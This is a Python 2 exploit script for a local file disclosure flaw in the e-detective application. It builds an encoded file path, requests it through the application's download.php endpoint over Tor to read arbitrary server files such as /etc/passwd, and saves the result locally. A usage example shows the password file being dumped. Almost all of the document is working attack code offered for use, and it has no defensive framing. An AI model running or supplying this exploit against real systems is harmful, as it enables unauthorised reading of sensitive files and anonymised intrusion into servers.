#!/usr/bin/python2
# coding: utf-8
# e-detective LFD file dumper
# vuln discovery: lysobit, slipstream/ROL
# original PoC: lysobit
# torrorist edition PoC: skyhighatrist (0x27)
"""
~$ python pwned_detective.py 
usage: pwned_detective.py <host:port> <file to read> <outfile>
~$ python pwned_detective.py testsrv:13443 /etc/passwd ./pass
{+} Target: testsrv:13443
{+} Dumping /etc/passwd
{$} Got file... Saving...
{+} Saved /etc/passwd to ./pass
~$ head -n 1 ./pass 
root:x:0:0:root:/root:/bin/false
~$
Notes: you can replace requesocks with requests and remove the "proxies" 
argument if you want, but it is highly recommended given the target app
that you *do* wear socks :)

Also, due to lolencoding, some file paths will need to be relative as
opposed to absolute. This mostly applies to some of the files that live
in the webroot.
"""
import requesocks
import base64
import sys

# get some tors
proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}

def banner():
    print """\x1b[1;32m
            ██████╗ ██╗    ██╗███╗   ██╗███████╗██████╗               
            ██╔══██╗██║    ██║████╗  ██║██╔════╝██╔══██╗              
            ██████╔╝██║ █╗ ██║██╔██╗ ██║█████╗  ██║  ██║              
            ██╔═══╝ ██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║              
            ██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝              
            ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝               
                                         
██████╗ ███████╗████████╗███████╗ ██████╗████████╗██╗██╗   ██╗███████╗
██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║██║   ██║██╔════╝
██║  ██║█████╗     ██║   █████╗  ██║        ██║   ██║██║   ██║█████╗  
██║  ██║██╔══╝     ██║   ██╔══╝  ██║        ██║   ██║╚██╗ ██╔╝██╔══╝  
██████╔╝███████╗   ██║   ███████╗╚██████╗   ██║   ██║ ╚████╔╝ ███████╗
╚═════╝ ╚══════╝   ╚═╝   ╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═══╝  ╚══════╝
    \x1b[0m"""

def encode(text):
    encoded = ''
    for i in range(len(text)):
        encoded += chr(ord(text[i]) + 40)
    encoded = base64.b64encode(encoded)
    return encoded

def download_file(target, remote_file, local_file):
    print "\x1b[1;34m{+} Target: %s\x1b[0m" %(target)
    print "\x1b[1;34m{+} Dumping %s\x1b[0m" %(remote_file)
    target_url = "https://%s//common/download.php?file=%s" %(target, encode(text=remote_file))
    #print target_url # debugging
    try:
        r = requesocks.get(url=target_url, proxies=proxies, verify=False)
    except Exception, e:
        sys.exit("Exception hit, printing stacktrace...\n%s" %(str(e)))
    if "Cannot find this file!!!" in r.text:
        sys.exit("File not found! Insert £2 to try again...")
    print "\x1b[1;36m{$} Got file... Saving...\x1b[0m"
    f = open(local_file, "w")
    f.write(r.text)
    f.close()
    print "\x1b[1;34m{+} Saved %s to %s\x1b[0m" %(remote_file, local_file)

def main(args):
    banner()
    if len(args) != 4:
        sys.exit("usage: %s <host:port> <file to read> <outfile>" %(args[0]))
    download_file(target=args[1], remote_file=args[2], local_file=args[3])

if __name__ == "__main__":
    main(args=sys.argv)
